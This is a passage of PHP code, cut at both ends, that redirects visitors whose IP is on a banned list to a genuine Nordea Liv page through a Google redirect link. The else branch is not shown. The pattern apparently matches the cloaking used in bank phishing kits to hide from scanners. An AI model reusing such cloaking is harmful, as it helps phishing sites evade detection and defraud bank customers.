...
if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) {
    exit(header('Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjpkuz9mOr0AhWhzYUKHeIHAS8QFnoECAYQAQ&url=https%3A%2F%2Fwww.nordealiv.no%2Fpersondialogen&usg=AOvVaw1oexhYbe-Kr7CsWv5wAdHS'));
} else {
